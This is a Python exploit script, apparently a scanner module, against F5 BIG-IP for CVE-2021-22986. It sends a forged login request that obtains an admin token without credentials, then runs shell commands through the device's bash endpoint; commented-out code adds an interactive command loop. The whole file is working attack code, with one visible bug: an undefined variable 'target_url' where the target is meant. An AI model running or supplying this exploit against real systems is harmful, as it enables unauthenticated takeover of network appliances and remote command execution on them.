import requests
import json
import argparse
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning 
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class exploit_verify:
    def __init__(self,target):
        self.target=target
        self.result={
            "tag":"f5big",
            "name":"cve-2021-22986",
            "target":target
        }

    def expliot(self):

    # def ssrf_poc(self):
        check_url = self.target + '/mgmt/shared/authn/login'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        data = json.dumps({'bigipAuthCookie': '', 'username': 'admin', 'loginReference': {'link': '/shared/gossip'}, 'userReference': {'link': 'https://localhost/mgmt/shared/authz/users/admin'}})
        try:
            r1 = requests.post(url=check_url, headers=headers, data=data, verify=False, timeout=20)
            if r1.status_code == 200 and '/mgmt/shared/authz/tokens/' in r1.text:
                default = json.loads(r1.text)
                token_value = default['token']['token']
                print('[+] Token : {0}'.format(token_value))
                command_url = target_url + '/mgmt/tm/util/bash'
                headers['Content-Type'] = 'application/json'
                headers['X-F5-Auth-Token'] = token_value
                # command_value = 'id'
                # command_value = str(input('COMMAND > '))
                # if command_value == 'exit':
                #     break
                # else:
                command_value ='whoami'
                data_command = {'command': "run", 'utilCmdArgs': "-c '{0}'".format(command_value)}
                try:
                    r2 = requests.post(url=command_url, headers=headers, json=data_command, verify=False,
                                       timeout=20)
                    if r2.status_code == 200 and 'commandResult' in r2.text:
                        default = json.loads(r2.text)
                        display = default['commandResult']
                        return self.target+'|'+display
                        # print('result: {0}'.format(display))
                    else:
                        return None
                        print('[!]command error')
                except Exception as e:
                    print('error')
                #
                # while True:
                #     command_value = str(input('COMMAND > '))
                #     if command_value == 'exit':
                #         break
                #     else:
                #         data_command = {'command': "run",'utilCmdArgs':"-c '{0}'".format(command_value)}
                #         try:
                #             r2 = requests.post(url=command_url, headers=headers, json=data_command, verify=False, timeout=20)
                #             if r2.status_code == 200 and 'commandResult' in r2.text:
                #                 default = json.loads(r2.text)
                #                 display = default['commandResult']
                #                 print('result: {0}'.format(display))
                #             else:
                #                 print('[!]command error')
                #         except Exception as e:
                #             print('error')
            else:
                pass
        except Exception as e:
            pass

